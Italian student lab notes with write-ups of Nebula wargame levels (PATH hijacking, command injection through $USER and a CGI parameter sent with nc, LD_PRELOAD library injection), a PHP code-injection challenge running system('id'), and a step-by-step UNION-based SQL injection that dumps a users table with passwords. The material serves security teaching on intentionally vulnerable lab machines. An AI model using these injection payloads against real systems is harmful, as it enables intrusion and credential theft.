# Esercizi di laboratorio:  


### Nebula 
- lvl 00
- lvl 01:  
    Il comando echo dentro l'eseguibile è eseguito tramite il comando env, che consente di eseguire un comando esterno in un ambiente UNIX.  
    ```bash
    # echo $PATH contiene percorso ricerca UNIX dei binari 
    # si modifica PATH prependendo la directory /tmp
    export PATH=/tmp:$PATH
    echo $PATH # mostra /tmp come prima dir di ricerca

    # Si copia il file /bin/getflag in /tmp/echo 
    cp /bin/getflag /tmp/echo # ora env echo invoca getflag

    cd /home/flag01
    ./flag01 # invoca getflag con i privilegi di getflag!
    ```
- lvl 02:
    Nelle ultime righe del codice sorgente notiamo che viene copiata in un buffer una stringa rappresentante un comando, viene usata la variabile `$USER` come comando, usando export la ridefiniamo con una comand injection: comando_safe + carattere separatore + comando_malizioso + commento. 

    ```bash
    echo $USER # stampa valore corrente ossia: level02
    # si imposta l input malizioso in USER con export 
    export USER="level02; getflag #"
    echo $USER # otteniamo level02; getflag #
    cd /home/flag02
    ./flag02 # esegue getflag con i permessi fi flag02 in quanto il binario ha setuid attivo
    ```
- lvl 03
- lvl 05
- lvl 06
- lvl 07:
    In questa challenge si manomette uno script perl per eseguire getflag con permessi elevati. Nello script perl si prende in input un host ma non si sanifica l'input, si può eseguire una comand injection.  
    comand $\rightarrow$ 8.8.8.8 ; getflag \r\n\r\n (bisogna usare il webserver in ascolto)

    ```bash
    echo -ne "GET /index.cgi?Host=8.8.8.8%3Bgetflag\r\n\r\n" | nc localhost 7007
    ```
    Questo permette di eseguire `getflag` con i permessi di level07.  
    **nota importante**: Bisogna usare l'URL encoding per passare il carattere `;` in quanto tale carattere è speciale e viene consumato dal webserver per separare argomenti della query, si prende quindi il codice ASCII di `;` e lo si  traduce in esadecimeale ossia `3B`, si usa il carattere `%` per attivare l'URL encoding. 
    **nota2:** `\r\n\r\n` indica la fine degli header HTTP, senza il server non capisce che la richiesta è finita e non esegue il comando.    


- lvl 08
- lvl 10 (toctou)
- lvl 13:  
    Iniezione di libreria: si sfrutta la variabile di ambiente `LD_LIBRARY_PATH` o `LD_PRELOAD`.  
    Scopriamo che `LD_PRELOAD` contiene un elenco di librerire condivise e tali librerie sono collegate prima di tutte le altre richieste da un file binario eseguibile (LD_PRELOAD =/path/to/lib.so:/path2/...).  
    Attenzione: questa vulnerabilità funziona solo per file compilati dinamicamente in quanto server l'iniezione di libreria, se è statico allora non si può sfruttare questo exploit.  
    Step: 
    1. generare libreria condivisa che sovrascrive la funzione getuid(), facciamo ritornare sempre 1000 
    2. compilare la libreria con -shared e -fPIC 
    3. copiare l'eseguibile da /home/flag13/flag13 in /home/level13 per rimuovere il setuid
    4. iniettare la libreria: export LD_PRELOAD = ./setuid.so
    5. ottenre credenziali 

    ```c++
    // si scrive un eseguibile in c per sovrascrivere la funzione getuid:
    uid_t getuid(void){
        return 1000;
    }
    ```
    ```bash
    # generiamo libreria condivisa con gcc
    gcc -shared -fPIC -o getuid.so getuid.c 
    export LD_PRELOAD=./getuid.so 
    # copiamo il file eseguibile nella directory attuale per eliminare il setuid da esso
    cp /home/flag13/flag13 /home/level13

    # eseguiamo il file
    ./flag13 # -> otteniamo la password per flag13 (su flag13)
    ```

### Protostar 
- stack 01 
- stack 03
- stack 05


### Web4PenTesters
- Code Injection 1:
    Si guarda il codice sorgente in `/var/www/codeexec` e si nota che viene usata una stringa $str = 'echo...' e che tale stringa viene interpretata come una espressione php.  
    Si usa lo schema di attacco generico: 
    ``` 
    INPUT = input legittimo +  
            carattere separatore codice +  
            codice php arbitrario  +  
            carattere chiusura.  
    ```

    ```bash
    # useremo la seguente struttura per visualizzare i privilegi:
    name = hacker \" +
        + ; 
        + system("id");
        + \" 

    # andremo a scrivere nell\'url il seguente input:
    ...example1.php/name=hacker";system("id");"
    ```
    Questo ci permetterà di chiamare ID e vedere gli uid e gid 
- XSS 1 
- File include 1 
- SQL Injections 1:  
    Nel codice sorgente della sfida notiamo che viene costruita una stringa rappresentante uno statement SQL, tale input non viene controllato in alcun modo e viene mandato ad un DBMS MySQL per l'esecuzione.  
    Si adotta lo schema classico di iniezione al caso specifico.  
    È possibile usare l'operatore **`OR`** per iniettare un comando e l'espressione in questo modo diventa una _tautologia_

    ```bash
    # tautologia
    .../example1.php/name=root 'or 1=1%23 '#

    # clausola SELECT e ORDER BY (per determinare il numero di colonne)  
    .../exmaple1.php/name=root' UNION SELECT NULL,NULL,NULL,NULL,NULL%23 '#
    # oppure 
    .../exmaple1.php/name=root' ORDER BY 6 %23 '# genera un errore allora capisco che si tratta di 5 colonne, infatti:
    .../exmaple1.php/name=root' ORDER BY 5 %23 # non genera errore ! '#
    ```

    Una volta determinato il numero di colonne riesco a eseguire Query omogenee, a questo punto posso enumerare il db e ottenere il suo nome per avanzare nella SQL injection:

    - `root' UNION SELECT version(), database(), current_user(),4,5 %23`

    A questo punto ottengo il nome del DB ossia **exercises**

    Per estrarre le tabelle interessanti del DB devo iniettare il comando `information_schema.tables` tramite una UNION.  

    - `root' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables where table_schema='exercises'%23`  
    Noto che il db exercises ha una sola tabella di nome `users`  

    Faccio la stessa cosa ma per vedere la struttura della colonne  
    - `root' UNION SELECT column_name,2,3,4,5 from information_schema.columns where table_schema ='exercises and table_name='users' %23`
    Noto che la tabella users ha 5 colonne: id, name, age, groupid, passwd  

    A questo punto posso fare il dump della tabella, basta uno statement SELECT che selezioni le colonne interessanti (id,name,passwd) della tabella di interessa (users)

    - `root' UNION SELECT id,name,passwd,4,5 from users %23`

    ![result sql injection 1](../../images/sql_inj_result1.png)  

    **nota:** Se si è a corto di colonne riflesse si può usare la funzione di sistema `concat()` per concatenare valori di colonne diverse.  

    - `root' UNION SELECT concat(id,':',name,':',passwd),2,3,4,5 from users %23`  
    In questo modo l'ouput interessante ora è compattato in un unica colonna.  
    




